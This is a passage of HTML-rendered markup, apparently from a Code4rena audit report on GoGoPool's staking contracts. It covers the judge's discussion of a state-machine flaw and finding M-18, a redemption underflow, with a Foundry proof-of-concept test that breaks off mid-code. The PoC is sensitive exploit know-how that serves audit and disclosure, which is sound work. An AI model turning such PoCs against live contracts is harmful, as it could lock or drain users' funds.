class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp1</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">nopClaim</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claimAndRestake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getGGPRewards</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp1</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">//&lt;- Claim nodeOp1 rewards</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"tools-used-12\" style=\"position:relative;\"><a href=\"#tools-used-12\" aria-label=\"tools used 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools used</h3>\n<p>Foundry/VsCode</p>\n<h3 id=\"recommended-mitigation-steps-22\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-22\" aria-label=\"recommended mitigation steps 22 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The <code>MinipoolManager.sol::recordStakingError()</code> function should reset the Assigned high water <code>staking.resetAVAXAssignedHighWater(stakerAddr);</code> so the user can not claim rewards for a minipool with errors.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/471#issuecomment-1382233034\">emersoncloud (GoGoPool) commented</a>:</strong></p>\n<blockquote>\n<p>Good find. This is unique in terms of calling out <code>avaxAssignedHighWater</code> but I’m going to link other issues dealing with <code>recordStakingError</code> </p>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/819\">https://github.com/code-423n4/2022-12-gogopool-findings/issues/819</a></p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/471#issuecomment-1382233406\">emersoncloud (GoGoPool) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>Since this is not a leak of funds in the protocol but GGP rewards instead, I think a medium designation is more appropriate</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/471#issuecomment-1397195132\">0xju1ie (GoGoPool) commented</a>:</strong></p>\n<blockquote>\n<p>So the warden is incorrect about the order of events that should happen, the correct order is the following:</p>\n<ol>\n<li>NodeOp1 creates minipool</li>\n<li>Rialto calls <code>claimAndInitiateStaking()</code></li>\n<li>Rialto calls <code>recordStakingStart()</code> if the staking with avalanche was successful. If it was not, Rialto will call <code>recordStakingError()</code>. So Rialto will never be calling both of these functions, it is one or the other.</li>\n</ol>\n<p><code>avaxAssignedHighWater</code> is only changed in <code>recordStakingStart()</code>, so not sure we would want to reset it in <code>recordStakingError()</code>.</p>\n<p>Questioning the validity of the issue.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/471#issuecomment-1398365148\">emersoncloud (GoGoPool) commented</a>:</strong></p>\n<blockquote>\n<p>The key issue is that a minipool won’t ever go from <code>Staking</code> to <code>Error</code> state. It’s currently allowed in our state machine but it’s not a situation that can happen on the Avalanche network and something we’ll fix. In that way it depends on Rialto making a mistake to transition the minipool from staking to error. </p>\n<p>I think pointing out the issue in our state machine is valid and QA level.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/471#issuecomment-1415584261\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has highlighted an issue with the FSM of the system.</p>\n<p>While Rialto is assumed as a perfect actor, the code allows calling <code>recordStakingStart</code> and then <code>recordStakingError</code>.</p>\n<p>This state transition is legal, however will cause issues, such as setting <code>avaxAssignedHighWater</code> to a higher value than intended, which could allow the staker to be entitled to rewards.</p>\n<p>Because the State Transition will not happen in reality (per the Scope Requirements), am downgrading the finding to Medium Severity and believe the State Transition Check should be added to offer operators and end users a higher degree of on-chain guarantees.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed\">emersoncloud (GoGoPool) mitigated</a>:</strong></p>\n<blockquote>\n<p>Remove the state transition from Staking to Error: <a href=\"https://github.com/multisig-labs/gogopool/pull/28\">multisig-labs/gogopool#28</a></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed by <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/58\">RaymondFam</a> and <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/42\">hansfriese</a>.</p>\n<hr>\n<h2 id=\"m-18-users-may-not-be-able-to-redeem-their-shares-due-to-underflow\" style=\"position:relative;\"><a href=\"#m-18-users-may-not-be-able-to-redeem-their-shares-due-to-underflow\" aria-label=\"m 18 users may not be able to redeem their shares due to underflow permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/317\">[M-18] Users may not be able to redeem their shares due to underflow</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/317\">0xbepresent</a>, also found by <a href=\"undefined\">datapunk</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/778\">Franfran</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/758\">Breeje</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/732\">IllIllI</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/598\">Matin</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/593\">SmartSek</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/520\">nadin</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/461\">unforgiven</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/378\">fs0c</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/340\">btk</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/289\">ck</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/210\">0xdeadbeef0x</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/208\">0xdeadbeef0x</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/176\">rvierdiiev</a>, and <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/98\">Rolezn</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L191\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L191</a><br>\n<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L88\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L88</a></p>\n<p>The <code>totalReleasedAssets</code> variable is updated on the <a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L88\">syncRewards()</a> function if someone calls the function before <code>rewardsCycleEnd</code> the <a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L191\">redeemAVAX()</a> will be reverted because the <code>totalReleasedAssets</code> may not include all the rewards.</p>\n<p>The ggAvax holder can not redeem his funds until the <code>rewardsCycleEnd</code>.</p>\n<h3 id=\"proof-of-concept-22\" style=\"position:relative;\"><a href=\"#proof-of-concept-22\" aria-label=\"proof of concept 22 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>I did the next test:</p>\n<ol>\n<li>Create minipool (2000 avax)</li>\n<li>Deposit rewards to the minipool (200 AVAX rewards)</li>\n<li>Sync the rewards before the cycle ends</li>\n<li>Redeem function will revert</li>\n<li>Redeem will be available after the cycle end</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"70\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testRedeemUnderOverFlow</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Redeem function reverts arithmetic error</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 1.- Create minipool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 2.- Deposit rewards to the minipool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 3.- Sync the Rewards before the cycle end</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 4.- Redeem function will revert</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 5.- Redeem will be available after the cycle end.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Deposit liquid staker funds</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1200</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nodeAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">2000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ggpStakeAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">200</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bob</span><span class=\"mtk1\">, </span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bob</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ggAVAX</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositAVAX</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\">}();</span><span class=\"mtk3\">//Avax deposit 1200</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 1.- Create minipool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nodeOp</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getActorWithTokens</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;nodeOp&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk11\">uint128</span><span class=\"mtk1\">(</span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\">), </span><span class=\"mtk12\">ggpStakeAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Nodeop stake GGP and create minipoool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ggp</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">), </span><span class=\"mtk12\">ggpStakeAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stakeGGP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ggpStakeAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">MinipoolManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Minipool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mp</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">createMinipool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeAmt</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">2</span><span class=\"mtk1\">, </span><span class=\"mtk12\">nodeAmt</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">2</span><span class=\"mtk1\">, </span><span class=\"mtk12\">duration</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Rialto init recordStakingStart</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claimAndInitiateStaking</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">recordStakingStart</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">, </span><span class=\"mtk11\">randHash</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">skip</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp</span><span class=\"mtk1\">.</span><span class=\"mtk12\">duration</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 2.- Deposit rewards to the minipool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rewardsAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">nodeAmt</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulDivDown</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0.1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Rewards amount:&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">rewardsAmt</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">rewardsAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk12\">recordStakingEnd</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">nodeAmt</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">rewardsAmt</span><span class=\"mtk1\">}(</span><span class=\"mtk12\">mp</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">, </span><span class=\"mtk12\">rewardsAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 3.- Sync the Rewards before the cycle end</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ggAVAX</span><span class=\"mtk1\">.</span><span class=\"mtk11\">syncRewards</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maxRedeemSharesBob</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ggAVAX</span><span class=\"mtk1\">.</span><span class=\"mtk11\">maxRedeem</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bob</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;TotalReleasedAssets after syncRewards:&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ggAVAX</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalReleasedAssets</span><span class=\"mtk1\">() / </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;LastRewards after syncRewards:&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ggAVAX</span><span class=\"mtk1\">.</span><span class=\"mtk11\">lastRewardsAmt</span><span class=\"mtk1\">() / </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Bob maxRedeem():&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">maxRedeemSharesBob</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 4.- Redeem function will revert</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">skip</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Bob PreviewRedeem() after skip one day:&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ggAVAX</span><span class=\"mtk1\">.</span><span class=\"mtk11\">previewRedeem</span><span class=\"mtk1\">(</span><span class=\"mtk12\">maxRedeemSharesBob</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bob</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stdError</span><span class=\"mtk1\">.</span><span class=\"mtk12\">arithmeticError</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Revert by arithmetic error</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ggAVAX</span><span class=\"mtk1\">.</span><span class=\"mtk11\">redeemAVAX</span><span class=\"mtk1\">(</span><span class=\"mtk12\">maxRedeemSharesBob</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 5.- Redeem will be available after the cycle end.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">skip</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ggAVAX</span><span class=\"mtk1\">.</span><span class=\"mtk11\">rewardsCycleLength</span><span class=\"mtk1\">() + </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span 